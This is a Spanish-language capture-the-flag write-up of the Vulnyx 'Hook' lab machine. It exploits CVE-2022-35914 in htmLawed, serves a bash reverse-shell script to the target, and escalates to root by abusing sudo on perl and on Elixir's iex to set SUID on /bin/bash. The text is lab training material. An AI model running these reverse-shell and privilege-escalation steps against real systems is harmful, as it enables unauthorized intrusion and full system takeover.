---
title: Vulnyx - Hook
author: estx
date: 2024-04-25 16:41:00 +0800
categories: [Writeup, Vulnyx, Easy]
tags: [Linux, 'htmLawed', 'CVE-2022-35914' , 'abuse of privileges']
math: true
mermaid: true
image:
  path: /assets/images/Vulnyx/Easy/Hook/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hook Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnyx.

Técnicas usadas: **CVE-2022-35914, abuse of privileges**


### Fase de Reconocimiento 🧣

Como primer punto, identificamos la dirección IP de la **`Máquina Vulnyx`**

```bash
root@kali> arp-scan -I eth0 --local --ignoredups

<SNIP>
192.168.100.64	08:00:27:c6:4f:1d	PCS Systemtechnik GmbH
```
> Con esto identificamos todos los dispositivos en nuestra red local.

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n 192.168.100.64 -oG puertos`**

  ![](/assets/images/Vulnyx/Easy/Hook/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando

* **`nmap -p22,80,4369 -sCV 192.168.100.64 -oN versions`**

  ![](/assets/images/Vulnyx/Easy/Hook/02-versions.png)

> Lo que más llama la atención es el directorio **`htmLawed`**

c. Si investigamos más sobre **htmLawed** llegamos a este [post](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/) en el que nos mencionar el **CVE-2022-35914**. El directorio al que acceden es `/vendor/htmlawed/htmLawed/htmLawedTest.php`, sin embargo, si nos fijamos, el directorio listado en el archivo **robots.txt** es **htmLawed** por lo que podemos intuir que únicamente debemos visitar el fichero  **htmLawedTest.php**.


  ![](/assets/images/Vulnyx/Easy/Hook/03-url.png)

* Si seguimos las indicaciones del [post](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/), veremos que podemos modificar un hook con el fin de ejecutar comandos

  ![](/assets/images/Vulnyx/Easy/Hook/04-config.png)

  ![](/assets/images/Vulnyx/Easy/Hook/05-output.png)


d. Nos entablamos una reverse shell

```bash
❯ cat index.html

#!/bin/bash

bash -i >& /dev/tcp/192.168.100.55/4444 0>&1
---------------------------------------------

❯ python -m http.server 80

---------------------------------------------

❯ nc -lvnp 4444
```

> Con esto lo que hacemos es servir el archivo `index.html`, para que al ser requerido por la máquina víctima se ejecute el código **.sh**

* Hacemos que la máquina víctima solicite el archivo

![](/assets/images/Vulnyx/Easy/Hook/06-command.png)

![](/assets/images/Vulnyx/Easy/Hook/07-reverse.png)


### Escalada de Privilegios 💹

1. Hacemos el tratamiento de la TTY para trabajar de manera más cómoda con la reverse shell

```bash
bash-5.2$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
bash-5.2$ ^Z
[1]  + 66303 suspended  nc -lvnp 4444
❯ stty raw -echo;fg
[1]  + 66303 continued  nc -lvnp 4444
                                     reset xterm

bash-5.2$ export TERM=xterm-256color
bash-5.2$ source  /etc/skel/.bashrc 
www-data@hook:/var/www/html/htmLawed$
```

2. Listamos los privilegios a nivel de sudoers de este usuario

```bash
www-data@hook:/var/www/html/htmLawed$ sudo -l
User www-data may run the following commands on hook:
    (noname) NOPASSWD: /usr/bin/perl
```

* Como podemos ejecutar **perl** como el usuario noname ejecutaremos un comando para spawnear una bash

```bash
www-data@hook:/var/www/html/htmLawed$ sudo -u noname /usr/bin/perl -e 'exec "/bin/bash";'
bash-5.2$ whoami
noname
```

3. Ahora, vemos de nuevo los permisos a nivel de sudoers de este usuario

```bash
bash-5.2$ sudo -l

User noname may run the following commands on hook:
    (root) NOPASSWD: /usr/bin/iex
```

> **iex**: Es una consola interactiva para el lenguaje Elixir
{: .prompt-info }


* Al investigar una forma de ejecutar comando en Elixir obtenemos esto:

```elixir
System.cmd("whoami", [])  -> Comando sin argumentos
System.cmd("ls", ["la"]) -> Comando con argumentos
```


4. Lo que haremos es otorgar permiso **SUID** a la `/bin/bash` y, como este comando lo ejecutaremos como root, cualquier usuario podrá spawnear una bash como el usuario root sin necesidad de otorgar una contraseña

```elixir
iex(1)> System.cmd("chmod", ["+s", "/bin/bash"])
{"", 0} -> El `0` nos indica que el comando se ejecutó exitosamente
```

5. Por último nos salimos de esta consola interactiva con `Ctrl` + `c` y luego poniendo `a` y ejecutamos **bash -p**

```bash
iex(2)> 
BREAK: (a)bort (A)bort with dump (c)ontinue (p)roc info (i)nfo
       (l)oaded (v)ersion (k)ill (D)b-tables (d)istribution
a
----------------------------------------------------------------
bash-5.2$ bash -p
bash-5.2# whoami
root
```
